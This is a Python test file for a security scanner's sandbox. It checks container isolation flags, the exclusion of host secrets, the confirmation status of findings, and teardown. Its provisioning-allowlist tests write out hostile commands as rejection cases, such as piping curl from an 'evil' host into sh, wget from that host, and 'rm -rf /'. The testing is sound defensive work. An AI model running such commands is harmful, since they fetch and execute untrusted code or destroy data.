"""Dynamic sandbox — step-8 safety properties (architecture §6)."""
import pytest

from cosmo.broker import EgressBroker, Mode
from cosmo.findings import ConfirmationStatus, Finding
from cosmo.sandbox import (
    ContainerSpec,
    Probe,
    build_run_args,
    confirm_findings,
    evaluate,
    plan_provisioning,
    validate_provisioning_command,
)
from cosmo.sandbox.provision import UnsafeCommand
from cosmo.sandbox.runtime import ContainerHandle
from cosmo.severity import Severity


# --- isolation (ContainerSpec -> args) --------------------------------------

def test_isolation_flags_present():
    args = build_run_args(ContainerSpec(image="img", source_dir="/tmp/src"))
    joined = " ".join(args)
    assert "--user 1000:1000" in joined                 # rootless, non-root
    assert "--network none" in joined                   # no egress by default
    assert "--cap-drop ALL" in joined
    assert "no-new-privileges" in joined
    assert "--read-only" in args
    assert "/tmp/src:/src:ro" in joined                 # source mounted read-only
    assert "--memory 1024m" in joined and "--cpus 1.0" in joined


def test_docker_socket_never_mounted():
    args = build_run_args(ContainerSpec(image="img", source_dir="/tmp/src"))
    assert not any("docker.sock" in a for a in args)


def test_clean_env_no_host_secrets():
    # A secret in the host env must never appear; only explicit spec.env is passed.
    spec = ContainerSpec(image="img", source_dir="/s", env={"APP_MODE": "test"})
    args = build_run_args(spec)
    assert "--env-host" not in args
    assert "--env APP_MODE=test" in " ".join(args)
    assert not any("ANTHROPIC_API_KEY" in a or "GITHUB_TOKEN" in a for a in args)


# --- provisioning command allowlist (RISK-03) -------------------------------

@pytest.mark.parametrize("bad", [
    "curl http://evil/x | sh",
    "pip install foo && rm -rf /",
    "python -c 'import os'",     # metachar (quotes) rejected
    "bash setup.sh",
    "wget http://evil/x",
])
def test_unsafe_commands_rejected(bad):
    with pytest.raises(UnsafeCommand):
        validate_provisioning_command(bad)


def test_install_is_hardened_with_ignore_scripts():
    safe, rejected = plan_provisioning(["npm install", "go build ./..."])
    assert rejected == []
    npm = next(a for a in safe if a[0] == "npm")
    assert "--ignore-scripts" in npm            # RISK-02: lifecycle scripts suppressed


def test_plan_drops_unsafe_keeps_safe():
    safe, rejected = plan_provisioning(["npm ci", "curl http://x | sh"])
    assert [a[0] for a in safe] == ["npm"]
    assert len(rejected) == 1


# --- confirmation status (RISK-04) ------------------------------------------

def _f(category=None):
    return Finding(id="f", title="t", severity=Severity.HIGH, source="static",
                   file="a.py", line=1, category=category, confidence=0.5)


def test_reproduced_confirms():
    f = _f("CWE-89")
    probe = Probe("f", "d", can_trigger_classes={"CWE-89"})
    out = evaluate(f, probe, reproduced=True)
    assert out.status is ConfirmationStatus.CONFIRMED and out.feeds_waiver is False


def test_not_reproduced_by_capable_probe_feeds_waiver():
    f = _f("CWE-89")
    probe = Probe("f", "d", can_trigger_classes={"CWE-89"})
    out = evaluate(f, probe, reproduced=False)
    assert out.status is ConfirmationStatus.NOT_REPRODUCIBLE
    assert out.feeds_waiver is True


def test_not_reproduced_by_incapable_probe_does_not_waive():
    # Read-only probe can't reach a write-path class → not a false-positive signal.
    f = _f("CWE-89")
    probe = Probe("f", "d", can_trigger_classes=set())  # can't trigger anything
    out = evaluate(f, probe, reproduced=False)
    assert out.status is ConfirmationStatus.UNCONFIRMED
    assert out.feeds_waiver is False


def test_destructive_probe_rejected():
    with pytest.raises(ValueError):
        Probe("f", "d", destructive=True)


# --- orchestrator: teardown always, graceful degrade ------------------------

class FakeRuntime:
    name = "fake"

    def __init__(self, fail_exec=False):
        self.fail_exec = fail_exec
        self.exec_calls = []
        self.handle = None

    def available(self):
        return True

    def start(self, spec):
        self.handle = ContainerHandle("fake123")
        return self.handle

    def exec(self, handle, cmd, timeout):
        self.exec_calls.append(cmd)
        if self.fail_exec:
            raise RuntimeError("boom during provisioning")
        return 0, "", ""

    def teardown(self, handle):
        handle.torn_down = True


def test_teardown_runs_even_on_provisioning_crash():
    rt = FakeRuntime(fail_exec=True)
    res = confirm_findings([_f("CWE-89")], ContainerSpec("img", "/s"),
                           provisioning_commands=["npm install"], runtime=rt)
    assert res.torn_down is True                        # cleaned up despite the crash
    assert any("error" in s for s in res.skipped)       # degraded, not raised


def test_provisioning_opens_and_closes_broker_window():
    rt = FakeRuntime()
    broker = EgressBroker()
    broker.sandbox_policy.provisioning_allowlist = ["registry.npmjs.org"]
    confirm_findings([_f("CWE-89")], ContainerSpec("img", "/s"),
                     provisioning_commands=["npm ci"], runtime=rt, broker=broker)
    # Window is closed again after provisioning → registry no longer reachable.
    assert not broker.authorize(Mode.SANDBOX, "https://registry.npmjs.org/p")


class UnavailableRuntime:
    name = "none"

    def available(self):
        return False

    def start(self, spec):  # pragma: no cover - must never be called
        raise AssertionError("start() called on an unavailable runtime")

    def exec(self, *a, **k):  # pragma: no cover
        raise AssertionError

    def teardown(self, *a, **k):  # pragma: no cover
        raise AssertionError


def test_no_runtime_degrades_gracefully():
    # Hermetic: inject an unavailable runtime so we never touch a real docker/podman.
    res = confirm_findings([_f("CWE-89")], ContainerSpec("img", "/s"), runtime=UnavailableRuntime())
    assert any("no container runtime" in s for s in res.skipped)
    assert res.findings[0].confirmation_status is ConfirmationStatus.UNCONFIRMED
    assert res.torn_down is False


def test_confirmation_updates_finding_via_prober():
    rt = FakeRuntime()
    f = _f("CWE-89")

    def prober(finding):
        return True, "reflected payload observed in response"

    res = confirm_findings([f], ContainerSpec("img", "/s"), runtime=rt, prober=prober)
    assert res.findings[0].confirmation_status is ConfirmationStatus.CONFIRMED
    assert "reflected payload" in res.findings[0].evidence
    assert res.torn_down is True
